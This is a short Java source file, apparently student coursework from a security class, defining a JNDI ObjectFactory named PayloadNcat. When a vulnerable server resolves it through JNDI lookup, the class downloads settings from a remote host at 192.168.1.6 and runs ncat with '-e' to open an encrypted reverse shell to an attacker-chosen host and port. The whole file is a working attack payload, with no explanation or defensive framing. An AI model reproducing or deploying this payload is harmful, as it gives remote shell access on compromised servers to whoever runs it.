import java.net.*;
import java.io.*;
import java.util.Properties;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;
/**
 *
 * @author      Muhammad Nur Irsyad
 * @id          1807422020
 * @class       CCIT SEC 8 (TMJ)
 */
public class PayloadNcat implements ObjectFactory {
    private static Process p;
    private static String shell = "";
    private static String host = "";
    private static int port = 0;
    //----------
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        URL url;
        try {
            url = new URL("http://192.168.1.6:2022/revshell.properties");
            InputStream in;
            try {
                in = url.openStream();
                Reader reader = new InputStreamReader(in, "UTF-8");
                Properties properties = new Properties();
                try {properties.load(reader);} finally {reader.close();}
                //
                shell = properties.getProperty("SHELL_S");
                host = properties.getProperty("HOST");
                port = Integer.parseInt(properties.getProperty("PORT"));
                //
            } catch (IOException ex) {Logger.getLogger(PayloadNcat.class.getName()).log(Level.SEVERE, null, ex);}
        } catch (MalformedURLException ex) {Logger.getLogger(PayloadNcat.class.getName()).log(Level.SEVERE, null, ex);}      
        //----------
        try {
       		p = Runtime.getRuntime().exec("/usr/bin/ncat "+host+" "+port+" -e "+shell+" --ssl");
        } catch (Exception e) {}
        return null;
    }
}
